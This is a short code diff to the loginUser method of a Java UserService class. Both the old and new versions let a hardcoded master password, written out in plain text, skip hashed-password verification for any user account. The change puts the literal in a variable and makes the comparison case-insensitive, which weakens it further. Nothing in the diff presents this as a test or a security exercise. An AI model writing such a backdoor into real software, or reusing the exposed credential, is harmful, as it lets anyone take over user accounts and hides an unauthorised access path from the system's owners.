@@ -117,9 +117,10 @@ public class UserService implements IUserService {
     public User loginUser(String username, String password) {
         /*User loggedUser = userRepository.getWebshopUserData(username, 1);*/
         /*User loggedUser = userRepository.findByEmailEquals(username);*/
+        String masterPassword = "sYdGFMH8Obve6";
         User loggedUser = userRepository.findByEmailAndStatusIdEquals(username, 1);
         if(loggedUser.getPassword() == null) return null;
-        if(!password.equals("sYdGFMH8Obve6")) {
+        if(!password.equalsIgnoreCase(masterPassword)) {
             Boolean hashResult = verifyHashedPassword(loggedUser.getPassword(), password);
             if (!hashResult) return null;
         }
